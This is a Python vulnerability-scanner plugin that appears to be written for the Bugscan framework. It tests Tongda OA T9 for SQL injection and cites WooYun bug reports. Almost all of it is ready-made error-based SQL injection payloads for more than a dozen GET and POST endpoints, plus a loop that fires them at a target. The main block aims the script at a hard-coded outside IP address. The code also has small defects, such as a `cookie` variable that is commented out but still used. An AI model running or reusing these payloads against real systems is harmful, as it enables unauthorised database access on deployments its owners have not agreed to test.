#!/usr/bin/env python
#*_* coding: utf-8 *_*

#name: tongda oa t9 N处sql 注入
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2015-0101037
#refer2: http://www.wooyun.org/bugs/wooyun-2014-082959



def assign(service, arg):
    if service == "tongdaoa":
        return True, arg

def audit(arg):
    #debug
    #cookie = 'JSESSIONID=7EA8E07AA72303D26783FF26F9B0A726; PHPSESSID=87a20a12486590a5c5f8346d8d1a6b90; JSESSIONID=ABCED0BCF3F33C579EABC281FC19FEB6; userName=800051; SID_1217=3771a442eb13dae311e8dfbcb0d4bae6'
    #proxy = ('127.0.0.1', 8887)
    payloads1 = [
        't9/t9/project/system/act/T9ProjSystemAct/getStyleList.act?classNo=PROJ_TYPE\'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
        't9/t9/project/system/act/T9ProjSystemAct/getNewPriv.act?privCode=NOAPPROVE\'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
        't9/t9/project/system/act/T9ProjSystemAct/getApproveList.act?privCode=APPROVE\'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
        't9/t9/project/system/act/T9ProjSystemAct/getStyleList.act?classNo=PROJ_TYPE\'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
        't9/t9/core/funcs/doc/act/T9MyWorkAct/hasWork.act?sortId=183299992%20oR%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)',
        't9/t9/core/codeclass/act/T9CodeClassAct/deleteCodeItem.act?sqlId=133999995%20oR%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
        't9/t9/core/funcs/email/act/T9InnerEMailAct/deletM.act?bodyId=3)%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23&deType=4',
        't9/t9/subsys/oa/vote/act/T9VoteTitleAct/selectId2.act?seqId=323\'%20AND%20(SELECT%202538%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20\'GhCY\'=\'GhCY',
        't9/t9/subsys/oa/vote/act/T9VoteTitleAct/deleteVote.act?seqIds=9123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
        't9/t9/subsys/oa/vote/act/T9VoteTitleAct/clonVote.act?seqIds=9123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
        't9/t9/subsys/oa/vote/act/T9VoteTitleAct/updateNoTopVote.act?seqIds=9123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
        't9/t9/core/funcs/news/act/T9NewsShowAct/getDeskNewsAllList.act?type=WTFftW\'%20Or%20(SELECT%202538%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20\'GhCY\'=\'GhCY',
        't9/t9/core/funcs/workflow/act/T9MyWorkAct/hasWork.act?sortId=9123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
        't9/t9/core/funcs/workflow/act/T9WorkQueryAct/getFlowTypeJson.act?sortId=19123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
    ]
    #POST 型
    payloads2 = [
        't9/t9/core/funcs/doc/act/T9MyWorkAct/getMyWorkList.act?sortId=183239992%20oR%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)',
        't9/t9/core/funcs/message/weixun_share/act/T9WeiXunShareAct/getWeiXunById.act',
        't9/t9/core/funcs/diary/act/T9DiaryAct/deleteDia.act',
        't9/t9/core/funcs/email/act/T9EmailNameAct/saveName.act',
        't9/t9/core/funcs/email/act/T9EmailBoxAct/isBoxNameExist.act',
    ]
    posts = [
        'pageIndex=1&showLength=10&flowId=&typeStr=1&_=',
        'wxid=1\' UNION ALL SELECT NULL,md5(1),NULL,NULL,NULL,NULL,NULL#',
        'diaIds=2 AND (SELECT 4200 FROM(SELECT COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)',
        'name=xxxx&IS_USE=1&IS_USE1=1&NAME_ID=4\' AND (SELECT 5610 FROM(SELECT COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \'1\'=\'1',
        'boxName=xxxxx\' AND (SELECT 4999 FROM(SELECT COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \'VnVS\'=\'VnVS&boxId=1',
    ]
    md5_1 = 'c4ca4238a0b923820dcc509a6f75849b1'
    for payload in payloads1:
        code, head, res, err, _ = curl.curl2(arg + payload, cookie=cookie)
        if code == 200 and md5_1 in res:
            security_hole(payload+' : sql注入');
    for i in range(len(payloads2)):
        code, head, res, err, _ = curl.curl2(arg + payloads2[i], post=posts[i], cookie=cookie)
        if code == 200 and md5_1 in res:
            security_hole(payload+' POST: '+posts[i]+' sql注入');
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://222.184.237.181/')[1])